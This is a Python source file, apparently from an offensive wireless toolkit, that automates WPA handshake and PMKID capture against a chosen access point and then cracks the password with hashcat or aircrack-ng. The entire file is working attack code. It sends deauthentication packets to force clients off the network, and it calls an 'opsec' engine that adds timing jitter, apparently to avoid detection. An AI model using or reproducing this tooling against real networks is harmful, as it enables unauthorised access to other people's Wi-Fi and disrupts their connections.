"""Attack module — WPA handshake/PMKID capture and cracking."""

from __future__ import annotations

import os
import signal
import subprocess
import time
from dataclasses import dataclass
from enum import Enum

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from ..core.config import Config
from ..core.opsec import OpsecEngine

console = Console()


class AttackStrategy(Enum):
    PMKID = "pmkid"
    PASSIVE = "passive"
    DEAUTH = "deauth"


@dataclass
class CaptureResult:
    success: bool
    strategy: AttackStrategy
    capture_file: str | None = None
    hash_file: str | None = None
    message: str = ""


@dataclass
class CrackResult:
    success: bool
    password: str | None = None
    method: str = ""
    message: str = ""


class AttackModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec

    def select_strategy(self) -> list[AttackStrategy]:
        strategies = []

        strategies.append(AttackStrategy.PMKID)
        strategies.append(AttackStrategy.PASSIVE)

        if self.config.stealth.deauth_allowed:
            strategies.append(AttackStrategy.DEAUTH)

        console.print(
            f"[dim]Strategy order: "
            f"{' → '.join(s.value for s in strategies)}[/dim]"
        )
        return strategies

    def capture(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None = None,
        output_dir: str = "./captures",
    ) -> CaptureResult:
        os.makedirs(output_dir, exist_ok=True)
        self.opsec.pre_operation()

        strategies = self.select_strategy()
        for strategy in strategies:
            console.print(f"[cyan]Trying {strategy.value}...[/cyan]")

            if strategy == AttackStrategy.PMKID:
                result = self._capture_pmkid(interface, bssid, channel, output_dir)
            elif strategy == AttackStrategy.PASSIVE:
                result = self._capture_passive(interface, bssid, channel, output_dir)
            elif strategy == AttackStrategy.DEAUTH:
                result = self._capture_deauth(
                    interface, bssid, channel, client_mac, output_dir,
                )
            else:
                continue

            if result.success:
                console.print(f"[green]Capture successful via {strategy.value}![/green]")
                return result

            console.print(f"[yellow]{strategy.value} failed, trying next...[/yellow]")
            self.opsec.jitter(2.0)

        return CaptureResult(success=False, strategy=strategies[-1], message="All strategies exhausted")

    def _capture_pmkid(
        self, interface: str, bssid: str, channel: int, output_dir: str,
    ) -> CaptureResult:
        outfile = os.path.join(output_dir, f"pmkid_{bssid.replace(':', '')}.pcapng")

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(), console=console,
        ) as progress:
            progress.add_task("PMKID capture (waiting for response)...", total=None)

            proc = subprocess.Popen(
                ["sudo", "hcxdumptool",
                 "-i", interface,
                 "-o", outfile,
                 f"--filterlist_ap={bssid}",
                 "--filtermode=2",
                 "--enable_status=1"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            time.sleep(30)
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=10)

        if not os.path.exists(outfile) or os.path.getsize(outfile) == 0:
            return CaptureResult(
                success=False, strategy=AttackStrategy.PMKID,
                message="No PMKID captured",
            )

        hash_file = os.path.join(output_dir, f"pmkid_{bssid.replace(':', '')}.hc22000")
        result = subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, outfile],
            capture_output=True, text=True,
        )

        if result.returncode == 0 and os.path.exists(hash_file):
            return CaptureResult(
                success=True, strategy=AttackStrategy.PMKID,
                capture_file=outfile, hash_file=hash_file,
            )

        return CaptureResult(
            success=False, strategy=AttackStrategy.PMKID,
            message="PMKID conversion failed",
        )

    def _capture_passive(
        self, interface: str, bssid: str, channel: int, output_dir: str,
        timeout: int = 120,
    ) -> CaptureResult:
        prefix = os.path.join(output_dir, f"passive_{bssid.replace(':', '')}")

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(), console=console,
        ) as progress:
            progress.add_task(
                f"Passive capture (waiting {timeout}s for handshake)...", total=None,
            )

            proc = subprocess.Popen(
                ["sudo", "airodump-ng",
                 "-c", str(channel),
                 "--bssid", bssid,
                 "-w", prefix,
                 interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            start = time.time()
            while time.time() - start < timeout:
                time.sleep(5)
                cap_file = f"{prefix}-01.cap"
                if os.path.exists(cap_file):
                    check = subprocess.run(
                        ["aircrack-ng", cap_file],
                        capture_output=True, text=True,
                    )
                    if "1 handshake" in check.stdout:
                        proc.send_signal(signal.SIGINT)
                        proc.wait(timeout=5)
                        return CaptureResult(
                            success=True, strategy=AttackStrategy.PASSIVE,
                            capture_file=cap_file,
                        )

            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=5)

        return CaptureResult(
            success=False, strategy=AttackStrategy.PASSIVE,
            message="No handshake captured within timeout",
        )

    def _capture_deauth(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None, output_dir: str,
    ) -> CaptureResult:
        prefix = os.path.join(output_dir, f"deauth_{bssid.replace(':', '')}")

        dump_proc = subprocess.Popen(
            ["sudo", "airodump-ng",
             "-c", str(channel),
             "--bssid", bssid,
             "-w", prefix,
             interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)

        deauth_count = self.config.stealth.deauth_max_packets
        deauth_cmd = [
            "sudo", "aireplay-ng",
            "-0", str(deauth_count),
            "-a", bssid,
        ]
        if client_mac:
            deauth_cmd.extend(["-c", client_mac])
        deauth_cmd.append(interface)

        console.print(
            f"[yellow]Sending {deauth_count} deauth packets"
            f"{f' to {client_mac}' if client_mac else ' (broadcast)'}[/yellow]"
        )
        subprocess.run(deauth_cmd, capture_output=True)

        self.opsec.jitter(5.0)

        time.sleep(15)
        dump_proc.send_signal(signal.SIGINT)
        dump_proc.wait(timeout=5)

        cap_file = f"{prefix}-01.cap"
        if os.path.exists(cap_file):
            check = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True,
            )
            if "1 handshake" in check.stdout:
                return CaptureResult(
                    success=True, strategy=AttackStrategy.DEAUTH,
                    capture_file=cap_file,
                )

        return CaptureResult(
            success=False, strategy=AttackStrategy.DEAUTH,
            message="Deauth sent but no handshake captured",
        )

    def crack(self, capture: CaptureResult) -> CrackResult:
        if not capture.success:
            return CrackResult(success=False, message="No capture to crack")

        if capture.hash_file and self.config.use_hashcat:
            result = self._crack_hashcat(capture.hash_file)
            if result.success:
                return result

        if capture.capture_file:
            return self._crack_aircrack(capture.capture_file)

        return CrackResult(success=False, message="No suitable file for cracking")

    def _crack_hashcat(self, hash_file: str) -> CrackResult:
        console.print("[cyan]Cracking with hashcat (GPU)...[/cyan]")

        result = subprocess.run(
            ["hashcat",
             "-m", str(self.config.hashcat_mode),
             hash_file,
             self.config.wordlist,
             "--force",
             "--quiet"],
            capture_output=True, text=True,
        )

        if result.returncode == 0:
            show = subprocess.run(
                ["hashcat",
                 "-m", str(self.config.hashcat_mode),
                 hash_file, "--show"],
                capture_output=True, text=True,
            )
            if show.stdout.strip():
                password = show.stdout.strip().split(":")[-1]
                return CrackResult(
                    success=True, password=password, method="hashcat",
                )

        return CrackResult(success=False, method="hashcat", message="Hashcat exhausted wordlist")

    def _crack_aircrack(self, cap_file: str) -> CrackResult:
        console.print("[cyan]Cracking with aircrack-ng (CPU)...[/cyan]")

        result = subprocess.run(
            ["aircrack-ng",
             "-w", self.config.wordlist,
             "-q",
             cap_file],
            capture_output=True, text=True,
        )

        if "KEY FOUND!" in result.stdout:
            for line in result.stdout.split("\n"):
                if "KEY FOUND!" in line:
                    password = line.split("[")[1].split("]")[0].strip()
                    return CrackResult(
                        success=True, password=password, method="aircrack-ng",
                    )

        return CrackResult(
            success=False, method="aircrack-ng",
            message="Aircrack exhausted wordlist",
        )
